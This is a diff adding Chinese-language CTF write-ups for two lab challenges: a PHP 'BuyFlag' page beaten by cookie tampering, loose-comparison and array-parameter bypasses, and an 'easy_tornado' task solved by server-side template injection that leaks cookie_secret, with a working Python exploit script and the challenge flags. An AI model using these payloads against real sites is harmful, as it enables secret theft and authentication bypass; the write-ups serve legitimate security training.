@@ -1760,6 +1760,164 @@ array(24) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockeren
 
 ------
 
+### [极客大挑战 2019]BuyFlag
+
+靶机源代码如下：
+
+```php+HTML
+<!DOCTYPE HTML>
+<html>
+
+<head>
+    <title>Buy You Flag</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <!--[if lte IE 8]><script src="assets/js/ie/html5shiv.js"></script><![endif]-->
+    <link rel="stylesheet" href="assets/css/main.css" />
+    <!--[if lte IE 8]><link rel="stylesheet" href="assets/css/ie8.css" /><![endif]-->
+    <!--[if lte IE 9]><link rel="stylesheet" href="assets/css/ie9.css" /><![endif]-->
+</head>
+
+<body>
+    <!-- Page Wrapper -->
+    <div id="page-wrapper">
+        <!-- Header -->
+        <header id="header">
+            <h1><a href="index.php">Syclover</a></h1>
+            <nav id="nav">
+                <ul>
+                    <li class="special">
+                        <a href="#menu" class="menuToggle"><span>Menu</span></a>
+                        <div id="menu">
+                            <ul>
+                                <li><a href="index.php">Home</a></li>
+                                <li><a href="pay.php">PayFlag</a></li>
+                            </ul>
+                        </div>
+                    </li>
+                </ul>
+            </nav>
+        </header>
+        <!-- Main -->
+        <article id="main">
+            <header>
+                <h2>Flag</h2>
+                <p>Flag need your 100000000 money</p>
+            </header>
+            <section class="wrapper style5">
+                <div class="inner">
+                    <h3>attention</h3>
+                    <p>If you want to buy the FLAG:</br>
+                        You must be a student from CUIT!!!</br>
+                        You must be answer the correct password!!!
+                    </p>
+                    <hr />
+                    <p>
+                        Only Cuit's students can buy the FLAG</br>
+                    </p>
+                    <hr />
+                </div>
+            </section>
+        </article>
+        <!-- Footer -->
+        <footer id="footer">
+            <ul class="copyright">
+                <li>&copy; Syclover</li>
+                <li>Design: Cl4y</li>
+            </ul>
+        </footer>
+    </div>
+    <!-- Scripts -->
+    <script src="assets/js/jquery.min.js"></script>
+    <script src="assets/js/jquery.scrollex.min.js"></script>
+    <script src="assets/js/jquery.scrolly.min.js"></script>
+    <script src="assets/js/skel.min.js"></script>
+    <script src="assets/js/util.js"></script>
+    <!--[if lte IE 8]><script src="assets/js/ie/respond.min.js"></script><![endif]-->
+    <script src="assets/js/main.js"></script>
+</body>
+<!--
+    ~~~post money and password~~~
+if (isset($_POST['password'])) {
+    $password = $_POST['password'];
+    if (is_numeric($password)) {
+        echo "password can't be number</br>";
+    }elseif ($password == 404) {
+        echo "Password Right!</br>";
+    }
+}
+-->
+
+</html>
+```
+
+`is_numeric()`判断是否为数字，纯数字返回`true`，否则返回`false`。 这道题注释的代码要求输入一个非纯数字的字符串且等于404的密码。`F12`将网页`Cookie`中`user`的`0`值修改为`1`。`HackBar`传入`password=404a&money[]=abc`，这样就能有足够的钱，从而得到`flag{746a2b4e-79f2-4732-9eee-13b483128a16}`。
+
+------
+
+### [护网杯 2018]easy_tornado
+
+靶机信息如下：
+
+```html
+/flag.txt
+flag in /fllllllllllllag
+
+/welcome.txt
+render
+
+/hints.txt
+md5(cookie_secret+md5(filename))
+```
+
+网址里有参数`filename`和`filehash`推测出`filename=/fllllllllllllag&filehash=md5(cookie_secret+md5(filename))`。 已知`filename`，`cookie_secret`在哪呢？`hints`提示`render`，又根据题目**easy_tornado**可推测出**服务器模板注入。**
+
+> **SSTI注入**就是服务器端模板注入(Server-Side Template Injection)。
+>
+> 服务端模板：相当于很多公式，根据变量输出结果。这里的模板就是模板引擎根据数据自动生成前端页面。
+>
+> SSTI也是SSTI利用的是网站模板引擎，主要针对python、php、java的一些网站处理框架（比如Python的Jinja2, Mako, Tornado, Django，PHP的Smarty, Twig，Java的Jade, Velocity），SSTI获取了一个输入，然后在后端的渲染处理上进行了语句的拼接，然后执行。错误的执行了用户输入。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。
+
+`render()`是`tornado`中的一个渲染函数，可以生成`html`模板，即一个能输出前端页面的公式。
+
+`Tornado`框架的附属文件`handler.settings`中存在`cookie_secret`，`Handler`指向的是处理当前这个页面的`RequestHandler`对象。
+
+`/error?msg={{handler.settings}}`得到`cookie_secret`的值。
+
+知道`filename`和`cookie_secret`后`md5`加密，发送`GET`请求就完事啦。编写`Python`代码求解得到`flag{20061188-f642-48fb-9449-a7abe827c713}`。
+
+```python
+import ast
+import requests
+from hashlib import md5
+from bs4 import BeautifulSoup
+
+url = 'http://62002d18-8984-40cd-afd1-1de9523c39d9.node4.buuoj.cn:81/'
+response = requests.get(url=url+'error?msg={{handler.settings}}')
+if response.status_code == 200:
+    soup = BeautifulSoup(response.text, 'html.parser')
+    cookie_secret = ast.literal_eval(soup.body.contents[0])['cookie_secret']
+    print('cookie_secret:'+cookie_secret)
+else:
+    print('Get cookie_secret error!')
+
+filename = '/fllllllllllllag'
+tmp = md5(filename.encode()).hexdigest() 
+filehash = md5((cookie_secret+tmp).encode()).hexdigest()
+print('filehash:'+filehash)
+response = requests.get(url+'file?filename={}&filehash={}'.format(filename, filehash))
+if response.status_code == 200:
+    soup = BeautifulSoup(response.text, 'html.parser')
+    flag = soup.contents[2]
+    print('flag:'+flag)
+else:
+    print('Get flag error!')
+```
+
+------
+
+
+
 ## PwnTheBox
 
 ### [XSS](https://ce.pwnthebox.com/challenges?type=5&id=673)
